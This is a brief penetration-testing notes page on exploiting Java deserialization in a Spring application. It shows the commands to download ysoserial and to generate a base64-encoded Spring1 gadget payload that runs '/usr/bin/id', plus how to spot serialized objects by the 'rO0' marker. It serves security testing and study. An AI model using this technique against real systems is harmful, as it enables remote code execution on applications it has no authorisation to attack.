# ObjectInputStream - ysoserial

## ObjectInputStream - ysoserial

### Context

A Spring application that uses serialized Java objects.

The application is using the method readObject\(\) \(exposed to user input\).

To be able to exploit this vulnerability, a chain of gadgets must be found \(using ysoserial\).

### Exploitation

* download ysoserial

```csharp
wget  https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-master-6eca5bc740-1.jar
java -jar ysoserial-master-6eca5bc740-1.jar
```

![](../../../../.gitbook/assets/image%20%2894%29.png)

* try to find the right payload \(try them all if enumeration fails ....\)

### Vulnerable endpoint

Find where the serialized object is used. A good indicator is the string rO0, which is the base64 encoded version of \xac\xed\x00.

![](../../../../.gitbook/assets/image%20%28168%29.png)

#### Payload creation

* Application is using Spring1

```csharp
java -jar ysoserial-master-6eca5bc740-1.jar  Spring1  "/usr/bin/id" | base64 -w 0
```

![](../../../../.gitbook/assets/image%20%2815%29.png)

* Inject the payload

![](../../../../.gitbook/assets/image%20%28137%29.png)



### Resources

{% embed url="https://github.com/frohoff/ysoserial" %}





